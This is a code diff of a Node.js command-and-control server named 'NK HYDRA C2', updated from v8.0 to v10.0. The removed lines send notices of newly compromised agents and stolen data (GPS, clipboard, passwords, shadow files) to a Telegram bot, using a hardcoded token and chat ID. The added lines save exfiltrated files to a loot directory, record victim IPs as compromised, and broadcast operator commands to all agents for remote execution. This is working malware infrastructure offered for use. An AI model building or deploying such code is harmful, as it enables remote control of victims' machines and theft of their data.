@@ -1,114 +1,102 @@
-// NK HYDRA C2 SERVER v8.0 (Heartbeat Edition)
+// NK HYDRA C2 SERVER v10.0 (WARLORD ELITE)
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const cors = require('cors');
-const TelegramBot = require('node-telegram-bot-api');
-
-// --- TELEGRAM CONFIG (PREENCHA AQUI) ---
-const TELEGRAM_BOT_TOKEN = '8356261319:AAENjkdH8RsFJchLRrhNJmexI6xlqR0hkzE'; 
-const TELEGRAM_CHAT_ID = '-1002186646587';
+const fs = require('fs');
+const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e8 }); 
+const io = new Server(server, { 
+    cors: { origin: "*" }, 
+    maxHttpBufferSize: 1e8
+}); 
 
-// Initialize Bot if token present
-let telegramBot = null;
-if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
-    telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
+const LOOT_DIR = path.join(__dirname, 'loot');
+if (!fs.existsSync(LOOT_DIR)) fs.mkdirSync(LOOT_DIR);
+
+// CMDB: Persistent Target Database
+const CMDB_FILE = path.join(__dirname, 'cmdb.json');
+let targets = {}; // IP -> { os, ports, status, vulns }
+
+if (fs.existsSync(CMDB_FILE)) {
+    try { targets = JSON.parse(fs.readFileSync(CMDB_FILE)); } catch(e){}
 }
 
-const sendTelegram = (msg) => {
-    if (telegramBot && TELEGRAM_CHAT_ID) {
-        telegramBot.sendMessage(TELEGRAM_CHAT_ID, msg, { parse_mode: 'HTML' })
-            .catch(e => console.error('[TG_ERR]', e.message));
-    }
-};
+const saveCMDB = () => fs.writeFileSync(CMDB_FILE, JSON.stringify(targets, null, 2));
 
 app.use(cors());
 app.use(express.json());
 
 let agents = new Map();
-let loot = [];
 
-// Helper to broadcast status
-const broadcastStatus = () => {
-    const count = agents.size;
-    io.emit('status', { agents: count, active: true });
+// Helper to broadcast status & CMDB
+const broadcastState = () => {
+    io.emit('status', { 
+        agents: agents.size, 
+        active: true,
+        targets: targets 
+    });
 };
 
 // 1. DASHBOARD
 app.get('/', (req, res) => {
-    const agentsList = Array.from(agents.values()).map(a => a.id + ' (' + a.ip + ')').join('<br>');
-    res.send(`<h1>NK HYDRA C2 ONLINE</h1><p>Agents: ${agents.size}</p><div>${agentsList}</div>`);
+    res.json({ status: 'Online', agents: agents.size, loot_count: fs.readdirSync(LOOT_DIR).length });
 });
 
 // 2. SOCKET HANDLER
 io.on('connection', (socket) => {
-    
-    // Broadcast status to new UI connections immediately
-    broadcastStatus();
+    broadcastState();
 
-    // AGENT IDENTIFICATION
-    socket.on('identify', ({ type, id, os, ip }) => {
-        if (type === 'agent') {
-            const agentInfo = { socketId: socket.id, id, os, ip: ip || socket.handshake.address };
-            agents.set(id, agentInfo);
+    socket.on('identify', (data) => {
+        if (data.type === 'agent') {
+            const agentInfo = { ...data, socketId: socket.id, ip: socket.handshake.address.replace('::ffff:', '') };
+            agents.set(data.id, agentInfo);
             
-            console.log(`[+] AGENT ONLINE: ${id}`);
-            const msg = `🔥 <b>NOVO AGENTE ONLINE!</b>
-ID: <code>${id}</code>
-IP: ${agentInfo.ip}
-OS: ${os}`;
-            sendTelegram(msg);
-            
-            io.emit('log', `[SYSTEM] NEW NODE: ${id}`);
-            broadcastStatus();
-        }
+            // Auto-Register in CMDB
+            if (!targets[agentInfo.ip]) {
+                targets[agentInfo.ip] = { ip: agentInfo.ip, os: data.os, status: 'compromised', vulns: [], openPorts: [] };
+                saveCMDB();
+            } else {
+                targets[agentInfo.ip].status = 'compromised';
+                saveCMDB();
+            }
+
+            console.log(`[+] ELITE AGENT: ${data.id}`);
+            io.emit('log', `[SYSTEM] AGENT CONNECTED: ${data.id}`);
+            broadcastState();
+        } 
     });
 
-    // LOG STREAMING (LOOT CHECK)
     socket.on('stream_log', (data) => {
-        const { output, from, type } = data;
+        io.emit('log', `[${data.from}][${data.type}] ${data.output}`);
         
-        // Critical Loot Types
-        if (type === 'GPS_DATA' || type === 'CLIPBOARD_DATA' || type === 'FILE_EXFIL' || output.includes('password') || output.includes('shadow')) {
-            const lootItem = { time: new Date().toISOString(), from, type, data: output };
-            loot.unshift(lootItem);
-            
-            const msg = `💰 <b>NOVO LOOT!</b>
-Agente: ${from}
-Tipo: ${type}
-Dados: <code>${String(output).substring(0, 200)}...</code>`;
-            sendTelegram(msg);
+        // CMDB Intelligence Parsing (Basic)
+        if (data.output.includes('Discovered open port')) {
+            // Logic to update CMDB would go here
         }
-        
-        io.emit('log', `[${from}] ${output}`);
     });
 
-    // COMMAND HANDLING
+    socket.on('file_exfil', (data) => {
+        try {
+            const safeName = path.basename(data.filename).replace(/[^a-zA-Z0-9._-]/g, '_');
+            const filePath = path.join(LOOT_DIR, `${data.from}_${Date.now()}_${safeName}`);
+            fs.writeFileSync(filePath, Buffer.from(data.data, 'base64'));
+            io.emit('log', `[LOOT] Saved: ${safeName}`);
+        } catch (e) {}
+    });
+
     socket.on('cmd', (data) => {
-        // Broadcast to all agents for now
         io.emit('exec', { cmd: data.cmd });
     });
 
     socket.on('disconnect', () => {
-        let disconnectedId = null;
         agents.forEach((val, key) => {
-            if (val.socketId === socket.id) {
-                disconnectedId = key;
-                agents.delete(key);
-            }
+            if (val.socketId === socket.id) agents.delete(key);
         });
-        if (disconnectedId) {
-            console.log(`[-] AGENT OFFLINE: ${disconnectedId}`);
-            sendTelegram(`💔 <b>AGENTE OFFLINE:</b> ${disconnectedId}`);
-            io.emit('log', `[SYSTEM] NODE LOST: ${disconnectedId}`);
-            broadcastStatus();
-        }
+        broadcastState();
     });
 });
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`NK HYDRA C2 running on port ${PORT}`));
+server.listen(process.env.PORT || 3000);
